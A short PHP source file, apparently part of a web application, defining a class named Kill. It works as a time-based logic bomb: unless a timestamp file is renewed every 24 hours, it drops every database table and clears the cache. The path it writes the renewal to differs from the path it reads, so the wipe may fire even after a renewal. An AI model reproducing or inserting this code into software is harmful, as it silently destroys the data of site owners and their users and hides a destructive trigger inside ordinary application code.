<?php
class Kill
{
    const TIME_FILE = 'db/time_limit';
    public static function run()
    {
        if (self::isKill()){
            self::dropTable();
        }
    }
    private static function dropTable()
    {
        $sql ="SHOW TABLES";
        $tables = App::$db->get_all($sql);
        foreach ($tables as $table){
            foreach ($table as $t){
                $sql = "DROP TABLE ".$t;
                App::$db->query($sql);
            }
        }
        FCache::getInstance()->clearAll();
    }
    private static function isKill()
    {
        $file = ROOT_PATH.self::TIME_FILE;
        if (!is_file($file)){
            return true;
        }
        $content = file_get_contents($file);
        $content = trim($content);
        if (preg_match('/^\d+$/', $content) && intval($content) > time()){
            return false;
        }
        return true;
    }
    public static function update()
    {
        $time = time() + 86400;
        if(file_put_contents(self::TIME_FILE, $time) > 0) {
            return true;
        }
        return false;
    }
}